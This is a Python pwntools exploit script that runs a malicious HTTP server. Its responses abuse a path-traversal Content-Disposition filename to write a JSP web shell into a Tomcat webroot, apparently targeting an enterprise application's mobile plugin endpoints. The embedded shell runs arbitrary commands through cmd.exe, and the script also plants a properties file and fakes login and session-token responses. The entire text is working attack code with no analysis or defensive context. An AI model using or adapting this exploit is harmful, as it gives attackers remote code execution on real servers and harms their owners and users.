from pwn import *

s = server(8080)

shellContent='''
<%@ page language="java" contentType="text/html;charset=UTF-8" pageEncoding="UTF-8"%>
<%@ page import="java.io.*"%>
<%
out.print(System.getProperty("os.name").toLowerCase());
String  cmd = request.getParameter("cmd");
if(cmd != null){
    Process p =  Runtime.getRuntime().exec(new String[]{"cmd.exe","/c",cmd});
    InputStream input = p.getInputStream();
    InputStreamReader ins = new InputStreamReader(input, "GBK");
    BufferedReader br = new BufferedReader(ins);
    out.print("<pre>");
    String line;
    while((line = br.readLine()) != null) {
        out.println(line);
    }
    out.print("</pre>");
    br.close();
    ins.close();
    input.close();
    p.getOutputStream().close();
}
%>
'''.strip()

shellResponse=f'''
HTTP/1.0 200 OK
Server: SimpleHTTP/0.6 Python/3.8.10
Date: Wed, 04 Jan 2023 10:58:26 GMT
Content-type: application/octet-stream
Content-Length: {len(shellContent)}
Content-Disposition: filename=..\\..\\..\\tomcat\\webapps\\ROOT\\mobile\\plugin\\2\\pdfview\\web\\viewer.jsp
Last-Modified: Tue, 03 Jan 2023 07:52:59 GMT

'''.strip().replace('\n', '\r\n')+'\r\n'*2+shellContent

propsContent='''
ifHxyh=1
'''.strip()

propsResponse=f'''
HTTP/1.0 200 OK
Server: SimpleHTTP/0.6 Python/3.8.10
Date: Wed, 04 Jan 2023 10:58:26 GMT
Content-type: application/octet-stream
Content-Length: {len(propsContent)}
Content-Disposition: filename=..\\..\\..\\tomcat\\webapps\\ROOT\\WEB-INF\\classes\\csdev_hxyh.properties
Last-Modified: Tue, 03 Jan 2023 07:52:59 GMT

'''.strip().replace('\n', '\r\n')+'\r\n'*2+propsContent

createOutSysResponse='''
HTTP/1.0 200 OK
Server: SimpleHTTP/0.6 Python/3.8.10
Date: Wed, 04 Jan 2023 10:58:26 GMT
Content-type: application/json
Content-Length: 97
Last-Modified: Tue, 03 Jan 2023 07:52:59 GMT

{"message":"1","sessionkey":"aaaa","outsysid":"1234567","accesstoken":"1234567","cVersion":"100"}
'''.strip().replace('\n', '\r\n')+'\r\n'

downloadFlag = 'shell'

while True:
    cc = s.next_connection()
    msg = cc.recv()
    if '/mobile/plugin/Download.jsp'.encode() in msg and downloadFlag=='shell':
        downloadFlag='props'
        cc.send(shellResponse.encode())
    elif '/mobile/plugin/Download.jsp'.encode() in msg and downloadFlag=='props':
        downloadFlag='shell'
        cc.send(propsResponse.encode())
    elif '/mobile/plugin/AdminVerifyLogin.jsp'.encode() in msg or '/mobile/plugin/WxInterface.jsp'.encode() in msg:
        cc.send(createOutSysResponse.encode())